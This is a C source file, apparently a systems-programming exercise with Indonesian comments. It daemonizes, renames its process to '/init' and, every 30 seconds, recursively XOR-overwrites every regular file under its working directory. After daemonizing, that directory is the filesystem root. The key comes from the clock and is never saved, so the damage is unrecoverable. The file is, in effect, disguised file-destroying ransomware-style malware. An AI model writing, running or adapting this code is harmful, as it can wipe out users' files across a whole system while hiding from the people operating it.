#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>

void daemon() {
  pid_t pid, sid;        // Variabel untuk menyimpan PID
  pid = fork();     // Menyimpan PID dari Child Process

  /* Keluar saat fork gagal
  * (nilai variabel pid < 0) */
  if (pid < 0) {
    exit(EXIT_FAILURE);
  }

  /* Keluar saat fork berhasil
  * (nilai variabel pid adalah PID dari child process) */
  if (pid > 0) {
    exit(EXIT_SUCCESS);
  }

  umask(0);

  sid = setsid();
  if (sid < 0) {
    exit(EXIT_FAILURE);
  }

  if ((chdir("/")) < 0) {
    exit(EXIT_FAILURE);
  }

  close(STDIN_FILENO);
  close(STDOUT_FILENO);
  close(STDERR_FILENO);
}
void xorfile(const char *filename, unsigned int key) {
    char tmp_filename[512];
    snprintf(tmp_filename, sizeof(tmp_filename), "%s.tmp", filename);

    FILE *in = fopen(filename, "rb");
    FILE *out = fopen(tmp_filename, "wb");

    if (!in || !out) {
        perror("File error");
        if (in) fclose(in);
        if (out) fclose(out);
        return;
    }

    int ch;
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch ^ key, out);
    }

    fclose(in);
    fclose(out);

    remove(filename);
    rename(tmp_filename, filename);
}
void encrypt(const char *path, unsigned int key) {
    DIR *dir = opendir(path);
    if (!dir) return;

    struct dirent *entry;
    char fullpath[1024];

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == -1) continue;

        if (S_ISDIR(st.st_mode)) {
            encrypt(fullpath, key);
        } else if (S_ISREG(st.st_mode)) {
            xorfile(fullpath, key);
        }
    }
    closedir(dir);
}


int main(int argc, char *argv[]) {
    daemon();
    time_t rawtime = time(NULL);
    unsigned char key = (unsigned char)(rawtime & 0xFF);
    strncpy(argv[0], "/init", strlen(argv[0]));
    while (1) {
      char cwd[4096];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            encrypt(cwd, key);
        }
      sleep(30);
    }
  return 0;
}
